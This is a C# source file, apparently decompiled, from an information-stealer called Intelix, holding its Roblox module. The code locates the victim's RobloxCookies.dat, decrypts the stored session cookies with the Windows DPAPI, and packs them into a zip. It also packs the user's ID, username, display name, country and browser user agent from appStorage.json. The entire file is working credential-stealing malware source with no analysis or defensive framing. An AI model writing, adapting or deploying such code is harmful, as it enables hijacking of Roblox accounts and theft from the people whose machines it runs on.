using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using Intelix.Helper.Data;
using Intelix.Helper.Encrypted;

namespace Intelix.Targets.Games
{
	// Token: 0x02000029 RID: 41
	public class Roblox : ITarget
	{
		// Token: 0x06000075 RID: 117 RVA: 0x000055B4 File Offset: 0x000037B4
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Roblox", "LocalStorage", "RobloxCookies.dat");
			bool flag = !File.Exists(text);
			if (!flag)
			{
				Counter.CounterApplications counterApplications = new Counter.CounterApplications();
				counterApplications.Name = "Roblox";
				Match match = Regex.Match(File.ReadAllText(text), "\"CookiesData\"\\s*:\\s*\"(.*?)\"", RegexOptions.Singleline);
				bool flag2 = !match.Success;
				if (!flag2)
				{
					byte[] array = DpApi.Decrypt(Convert.FromBase64String(match.Groups[1].Value));
					bool flag3 = array == null;
					if (!flag3)
					{
						string text2 = "Roblox\\cookies.txt";
						zip.AddTextFile(text2, Encoding.UTF8.GetString(array).Replace("; ", "\n").Replace("#HttpOnly_.roblox.com", ".roblox.com"));
						counterApplications.Files.Add(text + " => " + text2);
						string text3 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Roblox", "LocalStorage", "appStorage.json");
						bool flag4 = !File.Exists(text3);
						if (!flag4)
						{
							List<string> list = new List<string>();
							string input = File.ReadAllText(text3);
							string pattern = "\"(PlayerExeLaunchTime|BrowserTrackerId|UserId|Username|DisplayName|CountryCode)\"\\s*:\\s*\"([^\"]*)\"";
							foreach (object obj in Regex.Matches(input, pattern))
							{
								Match match2 = (Match)obj;
								string value = match2.Groups[1].Value;
								string value2 = match2.Groups[2].Value;
								bool flag5 = !string.IsNullOrEmpty(value2);
								if (flag5)
								{
									list.Add(value + ": " + value2 + "\n");
								}
							}
							Match match3 = Regex.Match(input, "\"WebViewUserAgent\"\\s*:\\s*\"([^\"]*)\"");
							bool success = match3.Success;
							if (success)
							{
								string text4 = "Roblox\\useragent.txt";
								zip.AddTextFile(text4, match3.Groups[1].Value);
								counterApplications.Files.Add(text3 + " => " + text4);
							}
							bool flag6 = list.Count > 0;
							if (flag6)
							{
								string text5 = "Roblox\\information.txt";
								zip.AddTextFile(text5, string.Concat(list));
								counterApplications.Files.Add(text3 + " => " + text5);
							}
							bool flag7 = counterApplications.Files.Count > 0;
							if (flag7)
							{
								counterApplications.Files.Add("Roblox\\");
								counter.Games.Add(counterApplications);
							}
						}
					}
				}
			}
		}
	}
}
